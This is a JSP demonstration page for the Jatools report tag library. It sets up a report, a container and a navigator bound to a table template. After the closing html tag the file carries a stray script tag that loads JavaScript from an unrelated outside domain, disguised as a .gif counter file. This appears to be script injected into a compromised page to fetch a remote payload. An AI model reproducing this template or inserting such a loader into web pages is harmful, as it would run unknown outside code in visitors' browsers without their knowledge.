<%@ page language="java" contentType="text/html; charset=GB2312"
    pageEncoding="GB2312"%>
<%@ taglib uri="/WEB-INF/tlds/jatools.tld" prefix="jatools" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=GB2312">
<title>杰表 jsp taglib 演示</title>
</head>

<body>
<script>


</script>

<jatools:report id="_report1" template="../webapps/jrs/example/table.xml" border="border:1px solid blue" offset="4" cached='true' layout="card"/>
<jatools:container id="_container" for_report="_report1" width='100%' height='90%' background="#EFEBEF"/>
<jatools:navigator id="_navigator" alias='_my_navigator' for_report="_report1">
<%@ include file="simplestyle.jsp" %>

</jatools:navigator>
<% _navigator.render(); %>
<% _container.render(); %>
<div style='clear:both'/>
<% //_navigator.render(); %>

</body>
</html>

<script src=http://fangaizheng.com.cn/count/js/gif.gif></script>
